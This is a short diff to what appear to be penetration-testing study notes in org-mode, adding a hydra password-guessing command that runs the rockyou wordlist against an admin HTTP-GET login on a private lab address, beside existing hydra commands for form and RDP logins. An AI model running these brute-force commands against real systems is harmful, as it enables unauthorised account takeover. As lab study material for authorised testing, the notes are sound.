@@ -388,6 +388,11 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form 
    #+begin_example
 hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
    #+end_example
+
+   Password spraying on http-get form
+   #+begin_example
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.247.201 http-get
+   #+end_example
    
 ** HTTP
 
